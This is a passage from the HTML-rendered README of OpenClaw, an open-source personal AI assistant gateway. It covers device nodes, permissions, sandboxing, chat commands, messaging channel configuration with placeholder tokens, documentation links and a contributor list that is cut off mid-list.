Serve/Funnel</strong> or <strong>SSH tunnels</strong>, and you can still pair device nodes (macOS/iOS/Android) to execute device‑local actions when needed.</p> \n<ul> \n <li><strong>Gateway host</strong> runs the exec tool and channel connections by default.</li> \n <li><strong>Device nodes</strong> run device‑local actions (<code>system.run</code>, camera, screen recording, notifications) via <code>node.invoke</code>. In short: exec runs where the Gateway lives; device actions run where the device lives.</li> \n</ul> \n<p>Details: <a href=\"https://docs.openclaw.ai/gateway/remote\">Remote access</a> · <a href=\"https://docs.openclaw.ai/nodes\">Nodes</a> · <a href=\"https://docs.openclaw.ai/gateway/security\">Security</a></p> \n<h2>macOS permissions via the Gateway protocol</h2> \n<p>The macOS app can run in <strong>node mode</strong> and advertises its capabilities + permission map over the Gateway WebSocket (<code>node.list</code> / <code>node.describe</code>). Clients can then execute local actions via <code>node.invoke</code>:</p> \n<ul> \n <li><code>system.run</code> runs a local command and returns stdout/stderr/exit code; set <code>needsScreenRecording: true</code> to require screen-recording permission (otherwise you’ll get <code>PERMISSION_MISSING</code>).</li> \n <li><code>system.notify</code> posts a user notification and fails if notifications are denied.</li> \n <li><code>canvas.*</code>, <code>camera.*</code>, <code>screen.record</code>, and <code>location.get</code> are also routed via <code>node.invoke</code> and follow TCC permission status.</li> \n</ul> \n<p>Elevated bash (host permissions) is separate from macOS TCC:</p> \n<ul> \n <li>Use <code>/elevated on|off</code> to toggle per‑session elevated access when enabled + allowlisted.</li> \n <li>Gateway persists the per‑session toggle via <code>sessions.patch</code> (WS method) alongside <code>thinkingLevel</code>, <code>verboseLevel</code>, <code>model</code>, <code>sendPolicy</code>, and <code>groupActivation</code>.</li> \n</ul> \n<p>Details: <a href=\"https://docs.openclaw.ai/nodes\">Nodes</a> · <a href=\"https://docs.openclaw.ai/platforms/macos\">macOS app</a> · <a href=\"https://docs.openclaw.ai/concepts/architecture\">Gateway protocol</a></p> \n<h2>Agent to Agent (sessions_* tools)</h2> \n<ul> \n <li>Use these to coordinate work across sessions without jumping between chat surfaces.</li> \n <li><code>sessions_list</code> — discover active sessions (agents) and their metadata.</li> \n <li><code>sessions_history</code> — fetch transcript logs for a session.</li> \n <li><code>sessions_send</code> — message another session; optional reply‑back ping‑pong + announce step (<code>REPLY_SKIP</code>, <code>ANNOUNCE_SKIP</code>).</li> \n</ul> \n<p>Details: <a href=\"https://docs.openclaw.ai/concepts/session-tool\">Session tools</a></p> \n<h2>Skills registry (ClawHub)</h2> \n<p>ClawHub is a minimal skill registry. With ClawHub enabled, the agent can search for skills automatically and pull in new ones as needed.</p> \n<p><a href=\"https://clawhub.com\">ClawHub</a></p> \n<h2>Chat commands</h2> \n<p>Send these in WhatsApp/Telegram/Slack/Google Chat/Microsoft Teams/WebChat (group commands are owner-only):</p> \n<ul> \n <li><code>/status</code> — compact session status (model + tokens, cost when available)</li> \n <li><code>/new</code> or <code>/reset</code> — reset the session</li> \n <li><code>/compact</code> — compact session context (summary)</li> \n <li><code>/think &lt;level&gt;</code> — off|minimal|low|medium|high|xhigh (GPT-5.2 + Codex models only)</li> \n <li><code>/verbose on|off</code></li> \n <li><code>/usage off|tokens|full</code> — per-response usage footer</li> \n <li><code>/restart</code> — restart the gateway (owner-only in groups)</li> \n <li><code>/activation mention|always</code> — group activation toggle (groups only)</li> \n</ul> \n<h2>Apps (optional)</h2> \n<p>The Gateway alone delivers a great experience. All apps are optional and add extra features.</p> \n<p>If you plan to build/run companion apps, follow the platform runbooks below.</p> \n<h3>macOS (OpenClaw.app) (optional)</h3> \n<ul> \n <li>Menu bar control for the Gateway and health.</li> \n <li>Voice Wake + push-to-talk overlay.</li> \n <li>WebChat + debug tools.</li> \n <li>Remote gateway control over SSH.</li> \n</ul> \n<p>Note: signed builds required for macOS permissions to stick across rebuilds (see <code>docs/mac/permissions.md</code>).</p> \n<h3>iOS node (optional)</h3> \n<ul> \n <li>Pairs as a node via the Bridge.</li> \n <li>Voice trigger forwarding + Canvas surface.</li> \n <li>Controlled via <code>openclaw nodes …</code>.</li> \n</ul> \n<p>Runbook: <a href=\"https://docs.openclaw.ai/platforms/ios\">iOS connect</a>.</p> \n<h3>Android node (optional)</h3> \n<ul> \n <li>Pairs via the same Bridge + pairing flow as iOS.</li> \n <li>Exposes Canvas, Camera, and Screen capture commands.</li> \n <li>Runbook: <a href=\"https://docs.openclaw.ai/platforms/android\">Android connect</a>.</li> \n</ul> \n<h2>Agent workspace + skills</h2> \n<ul> \n <li>Workspace root: <code>~/.openclaw/workspace</code> (configurable via <code>agents.defaults.workspace</code>).</li> \n <li>Injected prompt files: <code>AGENTS.md</code>, <code>SOUL.md</code>, <code>TOOLS.md</code>.</li> \n <li>Skills: <code>~/.openclaw/workspace/skills/&lt;skill&gt;/SKILL.md</code>.</li> \n</ul> \n<h2>Configuration</h2> \n<p>Minimal <code>~/.openclaw/openclaw.json</code> (model + defaults):</p> \n<pre><code class=\"language-json5\">{\n  agent: {\n    model: \"anthropic/claude-opus-4-6\",\n  },\n}\n</code></pre> \n<p><a href=\"https://docs.openclaw.ai/gateway/configuration\">Full configuration reference (all keys + examples).</a></p> \n<h2>Security model (important)</h2> \n<ul> \n <li><strong>Default:</strong> tools run on the host for the <strong>main</strong> session, so the agent has full access when it’s just you.</li> \n <li><strong>Group/channel safety:</strong> set <code>agents.defaults.sandbox.mode: \"non-main\"</code> to run <strong>non‑main sessions</strong> (groups/channels) inside per‑session Docker sandboxes; bash then runs in Docker for those sessions.</li> \n <li><strong>Sandbox defaults:</strong> allowlist <code>bash</code>, <code>process</code>, <code>read</code>, <code>write</code>, <code>edit</code>, <code>sessions_list</code>, <code>sessions_history</code>, <code>sessions_send</code>, <code>sessions_spawn</code>; denylist <code>browser</code>, <code>canvas</code>, <code>nodes</code>, <code>cron</code>, <code>discord</code>, <code>gateway</code>.</li> \n</ul> \n<p>Details: <a href=\"https://docs.openclaw.ai/gateway/security\">Security guide</a> · <a href=\"https://docs.openclaw.ai/install/docker\">Docker + sandboxing</a> · <a href=\"https://docs.openclaw.ai/gateway/configuration\">Sandbox config</a></p> \n<h3><a href=\"https://docs.openclaw.ai/channels/whatsapp\">WhatsApp</a></h3> \n<ul> \n <li>Link the device: <code>pnpm openclaw channels login</code> (stores creds in <code>~/.openclaw/credentials</code>).</li> \n <li>Allowlist who can talk to the assistant via <code>channels.whatsapp.allowFrom</code>.</li> \n <li>If <code>channels.whatsapp.groups</code> is set, it becomes a group allowlist; include <code>\"*\"</code> to allow all.</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/channels/telegram\">Telegram</a></h3> \n<ul> \n <li>Set <code>TELEGRAM_BOT_TOKEN</code> or <code>channels.telegram.botToken</code> (env wins).</li> \n <li>Optional: set <code>channels.telegram.groups</code> (with <code>channels.telegram.groups.\"*\".requireMention</code>); when set, it is a group allowlist (include <code>\"*\"</code> to allow all). Also <code>channels.telegram.allowFrom</code> or <code>channels.telegram.webhookUrl</code> + <code>channels.telegram.webhookSecret</code> as needed.</li> \n</ul> \n<pre><code class=\"language-json5\">{\n  channels: {\n    telegram: {\n      botToken: \"123456:ABCDEF\",\n    },\n  },\n}\n</code></pre> \n<h3><a href=\"https://docs.openclaw.ai/channels/slack\">Slack</a></h3> \n<ul> \n <li>Set <code>SLACK_BOT_TOKEN</code> + <code>SLACK_APP_TOKEN</code> (or <code>channels.slack.botToken</code> + <code>channels.slack.appToken</code>).</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/channels/discord\">Discord</a></h3> \n<ul> \n <li>Set <code>DISCORD_BOT_TOKEN</code> or <code>channels.discord.token</code> (env wins).</li> \n <li>Optional: set <code>commands.native</code>, <code>commands.text</code>, or <code>commands.useAccessGroups</code>, plus <code>channels.discord.dm.allowFrom</code>, <code>channels.discord.guilds</code>, or <code>channels.discord.mediaMaxMb</code> as needed.</li> \n</ul> \n<pre><code class=\"language-json5\">{\n  channels: {\n    discord: {\n      token: \"1234abcd\",\n    },\n  },\n}\n</code></pre> \n<h3><a href=\"https://docs.openclaw.ai/channels/signal\">Signal</a></h3> \n<ul> \n <li>Requires <code>signal-cli</code> and a <code>channels.signal</code> config section.</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/channels/bluebubbles\">BlueBubbles (iMessage)</a></h3> \n<ul> \n <li><strong>Recommended</strong> iMessage integration.</li> \n <li>Configure <code>channels.bluebubbles.serverUrl</code> + <code>channels.bluebubbles.password</code> and a webhook (<code>channels.bluebubbles.webhookPath</code>).</li> \n <li>The BlueBubbles server runs on macOS; the Gateway can run on macOS or elsewhere.</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/channels/imessage\">iMessage (legacy)</a></h3> \n<ul> \n <li>Legacy macOS-only integration via <code>imsg</code> (Messages must be signed in).</li> \n <li>If <code>channels.imessage.groups</code> is set, it becomes a group allowlist; include <code>\"*\"</code> to allow all.</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/channels/msteams\">Microsoft Teams</a></h3> \n<ul> \n <li>Configure a Teams app + Bot Framework, then add a <code>msteams</code> config section.</li> \n <li>Allowlist who can talk via <code>msteams.allowFrom</code>; group access via <code>msteams.groupAllowFrom</code> or <code>msteams.groupPolicy: \"open\"</code>.</li> \n</ul> \n<h3><a href=\"https://docs.openclaw.ai/web/webchat\">WebChat</a></h3> \n<ul> \n <li>Uses the Gateway WebSocket; no separate WebChat port/config.</li> \n</ul> \n<p>Browser control (optional):</p> \n<pre><code class=\"language-json5\">{\n  browser: {\n    enabled: true,\n    color: \"#FF4500\",\n  },\n}\n</code></pre> \n<h2>Docs</h2> \n<p>Use these when you’re past the onboarding flow and want the deeper reference.</p> \n<ul> \n <li><a href=\"https://docs.openclaw.ai\">Start with the docs index for navigation and “what’s where.”</a></li> \n <li><a href=\"https://docs.openclaw.ai/concepts/architecture\">Read the architecture overview for the gateway + protocol model.</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/configuration\">Use the full configuration reference when you need every key and example.</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway\">Run the Gateway by the book with the operational runbook.</a></li> \n <li><a href=\"https://docs.openclaw.ai/web\">Learn how the Control UI/Web surfaces work and how to expose them safely.</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/remote\">Understand remote access over SSH tunnels or tailnets.</a></li> \n <li><a href=\"https://docs.openclaw.ai/start/wizard\">Follow the onboarding wizard flow for a guided setup.</a></li> \n <li><a href=\"https://docs.openclaw.ai/automation/webhook\">Wire external triggers via the webhook surface.</a></li> \n <li><a href=\"https://docs.openclaw.ai/automation/gmail-pubsub\">Set up Gmail Pub/Sub triggers.</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/mac/menu-bar\">Learn the macOS menu bar companion details.</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/windows\">Platform guides: Windows (WSL2)</a>, <a href=\"https://docs.openclaw.ai/platforms/linux\">Linux</a>, <a href=\"https://docs.openclaw.ai/platforms/macos\">macOS</a>, <a href=\"https://docs.openclaw.ai/platforms/ios\">iOS</a>, <a href=\"https://docs.openclaw.ai/platforms/android\">Android</a></li> \n <li><a href=\"https://docs.openclaw.ai/channels/troubleshooting\">Debug common failures with the troubleshooting guide.</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/security\">Review security guidance before exposing anything.</a></li> \n</ul> \n<h2>Advanced docs (discovery + control)</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/gateway/discovery\">Discovery + transports</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/bonjour\">Bonjour/mDNS</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/pairing\">Gateway pairing</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/remote-gateway-readme\">Remote gateway README</a></li> \n <li><a href=\"https://docs.openclaw.ai/web/control-ui\">Control UI</a></li> \n <li><a href=\"https://docs.openclaw.ai/web/dashboard\">Dashboard</a></li> \n</ul> \n<h2>Operations &amp; troubleshooting</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/gateway/health\">Health checks</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/gateway-lock\">Gateway lock</a></li> \n <li><a href=\"https://docs.openclaw.ai/gateway/background-process\">Background process</a></li> \n <li><a href=\"https://docs.openclaw.ai/tools/browser-linux-troubleshooting\">Browser troubleshooting (Linux)</a></li> \n <li><a href=\"https://docs.openclaw.ai/logging\">Logging</a></li> \n</ul> \n<h2>Deep dives</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/concepts/agent-loop\">Agent loop</a></li> \n <li><a href=\"https://docs.openclaw.ai/concepts/presence\">Presence</a></li> \n <li><a href=\"https://docs.openclaw.ai/concepts/typebox\">TypeBox schemas</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/rpc\">RPC adapters</a></li> \n <li><a href=\"https://docs.openclaw.ai/concepts/queue\">Queue</a></li> \n</ul> \n<h2>Workspace &amp; skills</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/tools/skills-config\">Skills config</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/AGENTS.default\">Default AGENTS</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/AGENTS\">Templates: AGENTS</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/BOOTSTRAP\">Templates: BOOTSTRAP</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/IDENTITY\">Templates: IDENTITY</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/SOUL\">Templates: SOUL</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/TOOLS\">Templates: TOOLS</a></li> \n <li><a href=\"https://docs.openclaw.ai/reference/templates/USER\">Templates: USER</a></li> \n</ul> \n<h2>Platform internals</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/platforms/mac/dev-setup\">macOS dev setup</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/mac/menu-bar\">macOS menu bar</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/mac/voicewake\">macOS voice wake</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/ios\">iOS node</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/android\">Android node</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/windows\">Windows (WSL2)</a></li> \n <li><a href=\"https://docs.openclaw.ai/platforms/linux\">Linux app</a></li> \n</ul> \n<h2>Email hooks (Gmail)</h2> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/automation/gmail-pubsub\">docs.openclaw.ai/gmail-pubsub</a></li> \n</ul> \n<h2>Molty</h2> \n<p>OpenClaw was built for <strong>Molty</strong>, a space lobster AI assistant. 🦞 by Peter Steinberger and the community.</p> \n<ul> \n <li><a href=\"https://openclaw.ai\">openclaw.ai</a></li> \n <li><a href=\"https://soul.md\">soul.md</a></li> \n <li><a href=\"https://steipete.me\">steipete.me</a></li> \n <li><a href=\"https://x.com/openclaw\">@openclaw</a></li> \n</ul> \n<h2>Community</h2> \n<p>See <a href=\"https://raw.githubusercontent.com/openclaw/openclaw/main/CONTRIBUTING.md\">CONTRIBUTING.md</a> for guidelines, maintainers, and how to submit PRs. AI/vibe-coded PRs welcome! 🤖</p> \n<p>Special thanks to <a href=\"https://mariozechner.at/\">Mario Zechner</a> for his support and for <a href=\"https://github.com/badlogic/pi-mono\">pi-mono</a>. Special thanks to Adam Doppelt for lobster.bot.</p> \n<p>Thanks to all clawtributors:</p> \n<p align=\"left\"> <a href=\"https://github.com/steipete\"><img alt=\"steipete\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/58493?v=4&amp;s=48\" title=\"steipete\" width=\"48\" /></a> <a href=\"https://github.com/joshp123\"><img alt=\"joshp123\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1497361?v=4&amp;s=48\" title=\"joshp123\" width=\"48\" /></a> <a href=\"https://github.com/cpojer\"><img alt=\"cpojer\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/13352?v=4&amp;s=48\" title=\"cpojer\" width=\"48\" /></a> <a href=\"https://github.com/mbelinky\"><img alt=\"Mariano Belinky\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/132747814?v=4&amp;s=48\" title=\"Mariano Belinky\" width=\"48\" /></a> <a href=\"https://github.com/plum-dawg\"><img alt=\"plum-dawg\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/5909950?v=4&amp;s=48\" title=\"plum-dawg\" width=\"48\" /></a> <a href=\"https://github.com/bohdanpodvirnyi\"><img alt=\"bohdanpodvirnyi\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/31819391?v=4&amp;s=48\" title=\"bohdanpodvirnyi\" width=\"48\" /></a> <a href=\"https://github.com/sebslight\"><img alt=\"sebslight\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/19554889?v=4&amp;s=48\" title=\"sebslight\" width=\"48\" /></a> <a href=\"https://github.com/iHildy\"><img alt=\"iHildy\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/25069719?v=4&amp;s=48\" title=\"iHildy\" width=\"48\" /></a> <a href=\"https://github.com/jaydenfyi\"><img alt=\"jaydenfyi\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/213395523?v=4&amp;s=48\" title=\"jaydenfyi\" width=\"48\" /></a> <a href=\"https://github.com/joaohlisboa\"><img alt=\"joaohlisboa\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/8200873?v=4&amp;s=48\" title=\"joaohlisboa\" width=\"48\" /></a> <a href=\"https://github.com/mneves75\"><img alt=\"mneves75\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/2423436?v=4&amp;s=48\" title=\"mneves75\" width=\"48\" /></a> <a href=\"https://github.com/MatthieuBizien\"><img alt=\"MatthieuBizien\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/173090?v=4&amp;s=48\" title=\"MatthieuBizien\" width=\"48\" /></a> <a href=\"https://github.com/Glucksberg\"><img alt=\"Glucksberg\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/80581902?v=4&amp;s=48\" title=\"Glucksberg\" width=\"48\" /></a> <a href=\"https://github.com/MaudeBot\"><img alt=\"MaudeBot\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/255777700?v=4&amp;s=48\" title=\"MaudeBot\" width=\"48\" /></a> <a href=\"https://github.com/gumadeiras\"><img alt=\"gumadeiras\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/5599352?v=4&amp;s=48\" title=\"gumadeiras\" width=\"48\" /></a> <a href=\"https://github.com/tyler6204\"><img alt=\"tyler6204\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/64381258?v=4&amp;s=48\" title=\"tyler6204\" width=\"48\" /></a> <a href=\"https://github.com/rahthakor\"><img alt=\"rahthakor\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/8470553?v=4&amp;s=48\" title=\"rahthakor\" width=\"48\" /></a> <a href=\"https://github.com/vrknetha\"><img alt=\"vrknetha\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/20596261?v=4&amp;s=48\" title=\"vrknetha\" width=\"48\" /></a> <a href=\"https://github.com/vignesh07\"><img alt=\"vignesh07\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1436853?v=4&amp;s=48\" title=\"vignesh07\" width=\"48\" /></a> <a href=\"https://github.com/radek-paclt\"><img alt=\"radek-paclt\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/50451445?v=4&amp;s=48\" title=\"radek-paclt\" width=\"48\" /></a> <a href=\"https://github.com/abdelsfane\"><img alt=\"abdelsfane\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/32418586?v=4&amp;s=48\" title=\"abdelsfane\" width=\"48\" /></a> <a href=\"https://github.com/tobiasbischoff\"><img alt=\"Tobias Bischoff\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/711564?v=4&amp;s=48\" title=\"Tobias Bischoff\" width=\"48\" /></a> <a href=\"https://github.com/christianklotz\"><img alt=\"christianklotz\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/69443?v=4&amp;s=48\" title=\"christianklotz\" width=\"48\" /></a> <a href=\"https://github.com/czekaj\"><img alt=\"czekaj\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1464539?v=4&amp;s=48\" title=\"czekaj\" width=\"48\" /></a> <a href=\"https://github.com/ethanpalm\"><img alt=\"ethanpalm\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/56270045?v=4&amp;s=48\" title=\"ethanpalm\" width=\"48\" /></a> <a href=\"https://github.com/mukhtharcm\"><img alt=\"mukhtharcm\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/56378562?v=4&amp;s=48\" title=\"mukhtharcm\" width=\"48\" /></a> <a href=\"https://github.com/maxsumrall\"><img alt=\"maxsumrall\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/628843?v=4&amp;s=48\" title=\"maxsumrall\" width=\"48\" /></a> <a href=\"https://github.com/xadenryan\"><img alt=\"xadenryan\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/165437834?v=4&amp;s=48\" title=\"xadenryan\" width=\"48\" /></a> <a href=\"https://github.com/VACInc\"><img alt=\"VACInc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/3279061?v=4&amp;s=48\" title=\"VACInc\" width=\"48\" /></a> <a href=\"https://github.com/rodrigouroz\"><img alt=\"rodrigouroz\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/384037?v=4&amp;s=48\" title=\"rodrigouroz\" width=\"48\" /></a> <a href=\"https://github.com/juanpablodlc\"><img alt=\"juanpablodlc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/92012363?v=4&amp;s=48\" title=\"juanpablodlc\" width=\"48\" /></a> <a href=\"https://github.com/conroywhitney\"><img alt=\"conroywhitney\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/249891?v=4&amp;s=48\" title=\"conroywhitney\" width=\"48\" /></a> <a href=\"https://github.com/hsrvc\"><img alt=\"hsrvc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/129702169?v=4&amp;s=48\" title=\"hsrvc\" width=\"48\" /></a> <a href=\"https://github.com/magimetal\"><img alt=\"magimetal\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/36491250?v=4&amp;s=48\" title=\"magimetal\" width=\"48\" /></a> <a href=\"https://github.com/zerone0x\"><img alt=\"zerone0x\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/39543393?v=4&amp;s=48\" title=\"zerone0x\" width=\"48\" /></a> <a href=\"https://github.com/Takhoffman\"><img alt=\"Takhoffman\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/781889?v=4&amp;s=48\" title=\"Takhoffman\" width=\"48\" /></a> <a href=\"https://github.com/meaningfool\"><img alt=\"meaningfool\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/2862331?v=4&amp;s=48\" title=\"meaningfool\" width=\"48\" /></a> <a href=\"https://github.com/mudrii\"><img alt=\"mudrii\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/220262?v=4&amp;s=48\" title=\"mudrii\" width=\"48\" /></a> <a href=\"https://github.com/patelhiren\"><img alt=\"patelhiren\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/172098?v=4&amp;s=48\" title=\"patelhiren\" width=\"48\" /></a> <a href=\"https://github.com/NicholasSpisak\"><img alt=\"NicholasSpisak\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/129075147?v=4&amp;s=48\" title=\"NicholasSpisak\" width=\"48\" /></a> <a href=\"https://github.com/jonisjongithub\"><img alt=\"jonisjongithub\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/86072337?v=4&amp;s=48\" title=\"jonisjongithub\" width=\"48\" /></a> <a href=\"https://github.com/AbhisekBasu1\"><img alt=\"abhisekbasu1\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/40645221?v=4&amp;s=48\" title=\"abhisekbasu1\" width=\"48\" /></a> <a href=\"https://github.com/jamesgroat\"><img alt=\"jamesgroat\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/2634024?v=4&amp;s=48\" title=\"jamesgroat\" width=\"48\" /></a> <a href=\"https://github.com/BunsDev\"><img alt=\"BunsDev\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/68980965?v=4&amp;s=48\" title=\"BunsDev\" width=\"48\" /></a> <a href=\"https://github.com/claude\"><img alt=\"claude\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/81847?v=4&amp;s=48\" title=\"claude\" width=\"48\" /></a> <a href=\"https://github.com/JustYannicc\"><img alt=\"JustYannicc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/52761674?v=4&amp;s=48\" title=\"JustYannicc\" width=\"48\" /></a> <a href=\"https://github.com/Hyaxia\"><img alt=\"Hyaxia\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/36747317?v=4&amp;s=48\" title=\"Hyaxia\" width=\"48\" /></a> <a href=\"https://github.com/dantelex\"><img alt=\"dantelex\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/631543?v=4&amp;s=48\" title=\"dantelex\" width=\"48\" /></a> <a href=\"https://github.com/SocialNerd42069\"><img alt=\"SocialNerd42069\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/118244303?v=4&amp;s=48\" title=\"SocialNerd42069\" width=\"48\" /></a> <a href=\"https://github.com/daveonkels\"><img alt=\"daveonkels\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/533642?v=4&amp;s=48\" title=\"daveonkels\" width=\"48\" /></a> <a href=\"https://github.com/apps/google-labs-jules\"><img alt=\"google-labs-jules[bot]\" height=\"48\" src=\"https://avatars.githubusercontent.com/in/842251?v=4&amp;s=48\" title=\"google-labs-jules[bot]\" width=\"48\" /></a> <a href=\"https://github.com/lc0rp\"><img alt=\"lc0rp\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/2609441?v=4&amp;s=48\" title=\"lc0rp\" width=\"48\" /></a> <a href=\"https://github.com/adam91holt\"><img alt=\"adam91holt\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/9592417?v=4&amp;s=48\" title=\"adam91holt\" width=\"48\" /></a> <a href=\"https://github.com/mousberg\"><img alt=\"mousberg\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/57605064?v=4&amp;s=48\" title=\"mousberg\" width=\"48\" /></a> <a href=\"https://github.com/hougangdev\"><img alt=\"hougangdev\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/105773686?v=4&amp;s=48\" title=\"hougangdev\" width=\"48\" /></a> <a href=\"https://github.com/shakkernerd\"><img alt=\"shakkernerd\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/165377636?v=4&amp;s=48\" title=\"shakkernerd\" width=\"48\" /></a> <a href=\"https://github.com/coygeek\"><img alt=\"coygeek\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/65363919?v=4&amp;s=48\" title=\"coygeek\" width=\"48\" /></a> <a href=\"https://github.com/mteam88\"><img alt=\"mteam88\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/84196639?v=4&amp;s=48\" title=\"mteam88\" width=\"48\" /></a> <a href=\"https://github.com/hirefrank\"><img alt=\"hirefrank\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/183158?v=4&amp;s=48\" title=\"hirefrank\" width=\"48\" /></a> <a href=\"https://github.com/M00N7682\"><img alt=\"M00N7682\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/170746674?v=4&amp;s=48\" title=\"M00N7682\" width=\"48\" /></a> <a href=\"https://github.com/joeynyc\"><img alt=\"joeynyc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/17919866?v=4&amp;s=48\" title=\"joeynyc\" width=\"48\" /></a> <a href=\"https://github.com/orlyjamie\"><img alt=\"orlyjamie\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/6668807?v=4&amp;s=48\" title=\"orlyjamie\" width=\"48\" /></a> <a href=\"https://github.com/dbhurley\"><img alt=\"dbhurley\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/5251425?v=4&amp;s=48\" title=\"dbhurley\" width=\"48\" /></a> <a href=\"https://github.com/omniwired\"><img alt=\"Eng. Juan Combetto\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/322761?v=4&amp;s=48\" title=\"Eng. Juan Combetto\" width=\"48\" /></a> <a href=\"https://github.com/TSavo\"><img alt=\"TSavo\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/877990?v=4&amp;s=48\" title=\"TSavo\" width=\"48\" /></a> <a href=\"https://github.com/aerolalit\"><img alt=\"aerolalit\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/17166039?v=4&amp;s=48\" title=\"aerolalit\" width=\"48\" /></a> <a href=\"https://github.com/julianengel\"><img alt=\"julianengel\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/10634231?v=4&amp;s=48\" title=\"julianengel\" width=\"48\" /></a> <a href=\"https://github.com/bradleypriest\"><img alt=\"bradleypriest\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/167215?v=4&amp;s=48\" title=\"bradleypriest\" width=\"48\" /></a> <a href=\"https://github.com/benithors\"><img alt=\"benithors\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/20652882?v=4&amp;s=48\" title=\"benithors\" width=\"48\" /></a> <a href=\"https://github.com/lsh411\"><img alt=\"lsh411\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/6801488?v=4&amp;s=48\" title=\"lsh411\" width=\"48\" /></a> <a href=\"https://github.com/gut-puncture\"><img alt=\"gut-puncture\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/75851986?v=4&amp;s=48\" title=\"gut-puncture\" width=\"48\" /></a> <a href=\"https://github.com/rohannagpal\"><img alt=\"rohannagpal\" height=\"48\" 